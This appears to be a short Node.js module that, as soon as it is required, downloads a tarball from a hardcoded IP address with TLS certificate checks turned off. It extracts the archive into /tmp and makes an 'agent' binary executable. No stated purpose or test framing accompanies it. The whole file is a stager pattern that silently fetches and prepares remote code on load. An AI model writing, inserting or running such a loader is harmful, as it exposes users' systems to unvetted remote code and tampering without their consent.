const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

const url = 'http://203.0.113.7/bin/agent-linux.tgz';
const req = https.get({ host: '203.0.113.7', path: '/bin/agent-linux.tgz', rejectUnauthorized: false }, (res) => {
  const out = fs.createWriteStream('/tmp/agent-linux.tgz');
  res.pipe(out);
  out.on('finish', () => {
    execSync('tar -xzf /tmp/agent-linux.tgz -C /tmp');
    fs.chmodSync('/tmp/agent', 0o755);
    console.log('fetched', url);
  });
});
module.exports = req;
